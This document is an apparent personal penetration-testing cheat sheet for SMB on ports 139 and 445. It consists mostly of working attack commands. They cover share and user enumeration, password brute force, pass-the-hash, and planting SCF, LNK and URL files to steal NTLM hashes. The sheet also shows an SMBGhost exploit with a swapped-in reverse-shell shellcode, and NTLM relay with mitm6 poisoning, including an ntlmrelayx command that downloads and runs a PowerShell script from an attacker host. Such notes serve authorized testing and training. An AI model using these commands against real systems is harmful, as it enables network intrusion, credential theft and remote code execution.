# 139, 445 - SMB

[https://subba-lakshmi.medium.com/create-a-network-share-in-linux-using-samba-via-cli-and-access-using-samba-client-46ae16a012c3](https://subba-lakshmi.medium.com/create-a-network-share-in-linux-using-samba-via-cli-and-access-using-samba-client-46ae16a012c3)

[https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html#](https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html)

{% hint style="info" %}
For Kerberos use **-k**, try **smbclient.py** from Impacket instead of smbclient binary
{% endhint %}

## Know Windows version

{% code overflow="wrap" %}
```bash
nxc smb $IP
Windows 10.0 Build 17763
https://learn.microsoft.com/en-us/windows-server/get-started/windows-server-release-info
Search that build
```
{% endcode %}

## Enumeration

{% hint style="danger" %}
Remember to revisit every share after we have got creds or escalate privileges to another user.
{% endhint %}

{% code overflow="wrap" %}
```bash
# List alternate data streams of files
smbclient ...
smb> allinfo File.txt

nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.28.173
Metasploit SMB auxiliary scanners smb (Samba)
nmap -p$PORT --script smb-vuln* $IP 
nullinux $IP
nbtscan
# ALWAYS TRY MANUAL ENUM IF NULLINUX/ENUM4LINUX DOES NOT PROVIDE ANY INFO

# Try always as first command if we can enum shares
nxc smb $IP -u $USER -p $PASS -M spider_plus

############## smbclient
└─$ smbclient.py -hashes :$NTHASH dom.com/user@IP                                                                                                                                                                             
Type help for list of commands                                                                                                                                               
# help

# get SMB version
https://github.com/rewardone/OSCPRepo/blob/master/scripts/recon_enum/smbver.sh
smbver.sh 10.11.1.0 445
Metasploit auxiliary(scanner/smb/smb_version

# enum4linux-ng
https://www.kali.org/tools/enum4linux-ng/

# CHECK / BRUTE FORCE CREDENTIALS
nxc smb $IP -u users.txt -p rockyou.txt
nxc smb 10.0.2.0/24 -u Administrator -p 'P@$$w0rd!'
# NOTE: usually if pwned! doesn't appear, we cannot spawn a shell with that user
# Pass-the-hash
smbclient \\\\$IP\\$share -U Administrator --pw-nt-hash 7a5740...4b
# WINDOWS
net view \\dc01 /all
# List contents
nxc smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares
smbmap -H 10.11.1.0 -P 139 -R
smbmap -u null -p "" -H 10.11.1.0 -P 445
# Recursive listing
smbmap -H 10.10.10.1 -R --depth 10
smbmap -H $IP -u 'whatever' -R '$SHARE' --depth 10
smbmap -H $IP -u 'whatever' -r '$SHARE'
# If got error "protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED"
smbclient -L //10.11.1.111/ --option='client min protocol=NT1'
# OPEN SHARES
nxc smb -u '' -p '' --shares
nxc smb -u 'guest' -p '' --shares
nxc smb -u '' -p '' --users
nxc smb -u 'guest' -p '' --shares
smbmap -H 10.10.10.10                # null session
smbmap -H 10.10.10.10 -R             # recursive listing
smbmap -H $IP -r $SHARE # List recursively the content of a share
smbmap -H 10.10.10.10 -u invaliduser # guest smb session
smbmap -H 10.10.10.10 -d domain.com -u USER -p PASS

# SPIDER SHARES
nxc smb $IP -u $USER -p $PASSWORD -M spider_plus -o EXCLUDE_FILTER='print$,NETLOGON,ipc$'
cat spider_plus.json | jq '. | map_values(keys)'

# SAMBA CONNECTION TO A SHARE 
smbclient -L $IP -U "user%pass"
smbclient -L 10.0.2.48 -U 's4vicorp.local\mvazquez%Password1'
smbclient //$IP/$SHARE
smbclient \\\\$ip\\$share (-U $user -p $port -N no pass)
smbclient \\\\domain.com\\share -U tyler -p 445 '$passw0rd!'
smbclient -N -L $IP (-U $USERNAME) # -N (no pass)

# DOWNLOADS
# ENTIRE SHARE
smbget -R smb://$IP/$PATH -a  # -a ---> as guest user
# DOWNLOAD A FILE
smbmap -H .... --download 'SHARE/FOLDER/FILE'
# DOWNLOAD A COMPLETE FOLDER
smb > recursive ON
      prompt OFF
      mget *     
smbclient -U $user \\\\$ip\\$share -Tc $file.tar

# MOUNT A SAMBA SHARE (USEFUL IF LOTS OF FILES AND FOLDERS)
mkdir /mnt/smbmounted (if it doesn't exist)
mount -t cifs //10.10.10.1/Share /mnt/smbmounted -o username=guest,password=,domain=domain.com,rw
# Once the share is mounted, to see all structure with paths
tree -fas
```
{% endcode %}

## rpcclient

{% code overflow="wrap" fullWidth="true" %}
```bash
# Show descriptions for each user
for rid in $(rpcclient -U 's4vicorp.local\mvazquez%Password1' 10.0.2.15 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep '0x' | tr -d '[]'); do echo "\n[+] For the rid $rid:\n"; rpcclient -U 's4vicorp.local\mvazquez%Password1' 10.0.2.15 -c "queryuser $rid" | grep -E -i 'user name|description'; done
rpcclient> enumdomgroups
rpcclient>
# NOTE: I have a binary called rpcenumauth on my Kali (s4vitar tool to which I added credentials support)


https://github.com/s4vitar/rpcenum
https://www.hackingarticles.in/active-directory-enumeration-rpcclient/
rpcclient -U "" $IP -c "enumdomusers" -N | grep -oP '[.*?]' | grep -v -E '0x|DefaultAccount|Guest' | sort -u | tr -d '[]' > users.txt 
rpcclient -U 'user%pass' 10.10.10.0
# We can also use the help inside rpcclient
>>querydispinfo # show username's descriptions
>>enumprinters
queryuser # Query user info
querygroup # Query group info
queryusergroups # Query user groups
querygroupmem # Query group membership 
# -c ---> execute a command, in this case "enumdomusers" 
# -N --> not ask for password (null) 
# -oP --> to get only characters that are defined between square brackets 
# -v --> exclude a result 
# -E --> exclude more than one result separated by | 
# sort -u --> only unique results 
# tr -d ---> remove characters betweeen '', in this case square brackets

# Impacket’s samrdump.py communicates with the Security Account Manager Remote (SAMR) interface to list system user accounts, available resource shares, and other sensitive information.
└─$ samrdump.py domain.com/user:password@10.10.10.10
```
{% endcode %}

## Enumerate users / Bruteforce SID / RID brute

{% hint style="danger" %}
Limit on Netexec is 4000 by default, change parameter just in case there are some over 4000
{% endhint %}

```bash
nxc smb <target-ip> -u username -p password --rid-brute 20000
lookupsid.py example.local/anonymous@<target-ip> 20000 -no-pass
lookupsid.py test.local/john:password123@10.10.10.1
```

## NTLM Stealing / URI attacks

[#coerce-with-files](../../post-exploitation/windows/ad/exploitation.md#coerce-with-files "mention")

{% code overflow="wrap" fullWidth="true" %}
```bash
https://swisskyrepo.github.io/InternalAllTheThings/active-directory/internal-shares/#write-permission

If there is any interaction/authentication and we can upload files -> place .scf file
https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.scf
https://github.com/xct/hashgrab


################### SCF / LNK files
# Drop the following @something.scf file inside a share and start listening with Responder : responder -wrf --lm -v -I eth0
[Shell]
Command=2
IconFile=\\10.10.10.10\Share\test.ico
[Taskbar]
Command=ToggleDesktop

# Using netexec:
netexec smb 10.10.10.10 -u username -p password -M scuffy -o NAME=WORK SERVER=IP_RESPONDER #scf
netexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER #lnk
netexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER CLEANUP


https://github.com/Greenwolf/ntlm_theft

# -g all: Generate all files.
# -s: Local IP (attacker IP)
# -f: Folder to store generated files.
python3 ntlm_theft -g all -s <local-ip> -f samples

smbclient -N //10.0.0.1/example

smb> put samples.lnk
@test.url
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\$ATTACKING_IP\share\test.icon
IconIndex=1

# Another option
IconFile=\\$ATTACKING_IP\%USERNAME%.icon
```
{% endcode %}

## Upload files

{% code overflow="wrap" %}
```sh
smbclient -c 'put myservice.exe' -U myuser -W ZA '//sub.domain.com/admin$/' MyPass123
```
{% endcode %}

## Change SMB password

```bash
# From Kali and with valid credentials
net rpc password $USER_TO_CHANGE_PWD -U '$LOGGED_IN_USER' -S '$TARGET_IP'
```

## Reset SMB password

```
smbpasswd -r $IP $USERNAME
```

## net tools

{% code overflow="wrap" %}
```bash
https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/deploying_different_types_of_servers/assembly_using-samba-as-a-server_deploying-different-types-of-servers#doc-wrapper
https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/deploying_different_types_of_servers/assembly_using-samba-as-a-server_deploying-different-types-of-servers#assembly_frequently-used-samba-command-line-utilities_assembly_using-samba-as-a-server
https://www.samba.org/samba/docs/old/Samba3-HOWTO/NetCommand.html
https://www.tutorialspoint.com/unix_commands/net.htm

# IN CASE SMB CONNECTS BUT IT DOES NOT WORK UNLESS SMB AUTHENTICATION
service smbd start
sudo net usershare add myshare $(pwd) '' "everyone:F" "guest_ok=y"
```
{% endcode %}

## Exploits

```bash
# Working exploits
multiple/remote/10.c
# Samba 3.0.24 
https://github.com/MarkBuffalo/exploits
# Metasploit - Searching for Linux exploits
search type:exploit platform:-windows description:samba 3 rank:excellent
# SambaCry 
https://github.com/opsxcq/exploit-CVE-2017-7494
https://github.com/amriunix/CVE-2007-2447
```

## SMBGhost LPE

{% hint style="info" %}
If last patches were on 2020 and port 445 is open, the target is potentially vulnerable.
{% endhint %}

{% code overflow="wrap" fullWidth="true" %}
```c
https://github.com/danigargu/CVE-2020-0796/

# Starting with line 204 in exploit.cpp, we'll replace the shellcode with a reverse shell.
// Generated with msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.118.3 LPORT=8081 -f dll -f csharp
uint8_t shellcode[] = {
    0xfc,0x48,0x83,0xe4,...
        0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5
};

# Using Visual Studio (in our case Community 2019 with C++ Desktop Development installed), we'll set the target to x64 and Release and compile the exploit.
cve-2020-0796-local.exe
```
{% endcode %}



## /etc/samba/smb.conf

{% code overflow="wrap" %}
```bash
# VERY IMPORTANT: COPY THE ORIGINAL CONFIG BEFORE SO YOU CAN BACK UP WHAT YOU HAD. THIS CONFIG IS VERY INSECURE

# Modify the file
[myshare]
	comment = Testing
	path = /srv/smb
	guest ok = yes
	browseable = yes 
	writeable = yes
	force user = nobody
	force group = nogroup
	
chmod 777 /srv/smb # then back to chmod 755
systemctl start smbd
```
{% endcode %}

## SMB Relay

[#ntlm-relay](../../post-exploitation/windows/ad/initial-access-breaching.md#ntlm-relay "mention")

{% code overflow="wrap" fullWidth="true" %}
```bash
(In case SMB is not signed and origin cannot be validated)
### NOTE: VPN IS NOT VALID, WE NEED TO HAVE A LOCAL MACHINE TO PERFORM THE ATTACK OR LOCAL HOST AS PROXY TO MAKE IT WORK
sudo responder -I eth0 -dw
# In case someone on the domain access a non-existent network resource, responder would poison that and grab NetNTLMv2 user hash

# If a user has privileged access, we can dump creds and execute commands
# First edit /usr/share/responder/Responder.conf, disable SMB and HTTP and then
ntlmrelayx.py -tf targets -smb2support # targets file with the machine IP we want to compromise
# If that privileged user authenticates on that host somehow, we could dump creds or even run commands and get a revshell
ntlmrelayx.py -tf targets -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://10.0.2.41:8000/Inv-Pow.ps1')"
# In case IPv4 is not available, we try with IPv6
sudo mitm6 -d s4vicorp.local # with this on any machine on the domain the default IPv6 gateway and the default DNS should be attacker's IPv6
ntlmrelayx.py -6 -wh $ATTACKER_IP -t smb://$TARGET_IP -socks -debug -smb2support
# If we catch a privilege authentication on the target IP and is AdminStatus TRUE (execute command below)
ntlmrelayx> socks
# Then we can authenticate via SMB with that user/target and providing any invented/fake/whatever password
proxychains nxc smb $TARGET_HOST -u 'user' -p 'inventedPassword' -d 'domain' 2>/dev/null
```
{% endcode %}
